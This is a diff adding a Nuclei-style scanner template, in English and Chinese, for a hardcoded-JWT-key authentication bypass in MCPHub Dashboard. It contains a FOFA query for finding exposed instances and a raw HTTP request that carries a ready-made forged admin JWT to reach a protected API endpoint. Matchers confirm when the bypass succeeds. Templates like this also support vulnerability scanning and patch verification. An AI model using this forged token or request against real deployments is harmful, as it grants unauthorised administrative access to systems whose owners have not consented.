@@ -1,0 +1,27 @@
+id: mcphub-dashboard-jwt-hardcoded-auth-bypass
+
+info:
+  name: "MCPHub Dashboard JWT硬编码密钥导致认证绕过"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="MCP Hub Dashboard"
+          该漏洞源于MCPHub Dashboard组件在JWT令牌生成过程中使用硬编码密钥，导致身份验证机制可被绕过。攻击者可通过构造特定请求直接访问受保护接口，无需经过常规身份验证流程。此缺陷可能允许未经授权的用户获取敏感数据或执行管理操作。
+  tags: MCPHub
+
+http:
+- raw:
+  - |
+    GET /api/auth/user HTTP/1.1
+    Host: {{Hostname}}
+    X-Requested-With: XMLHttpRequest
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    x-auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjp7InVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlfSwiaWF0IjoxNzU2MjkwNDUxLCJleHAiOjE3NTYzNzY4NTEwMDB9.mCej_jB1U06pG1vA4fc1NG7fS4HhMdG8c0BdJHGQ5sY
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'success'
